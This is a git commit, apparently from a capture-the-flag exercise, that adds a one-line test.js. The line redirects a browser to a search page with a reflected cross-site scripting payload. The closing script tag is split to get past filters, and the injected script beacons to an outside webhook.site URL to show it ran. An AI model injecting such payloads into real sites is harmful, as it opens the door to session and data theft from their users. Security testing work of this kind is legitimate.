88c65026b45f5367f9785c0941fa097448501880
ctf <ctf@local>
2026-05-15 22:24:18 -0400

    test

---
+++ test.js
@@ -0,0 +1,1 @@
+window.location = '/wastelandwonders/search?query=' + encodeURIComponent('<script>fetch("https://webhook.site/14a8d1cb-438a-4891-aa70-1b1b1c32a3c1/q3test_loaded?marker=hit",{mode:"no-cors"})</' + 'script>');
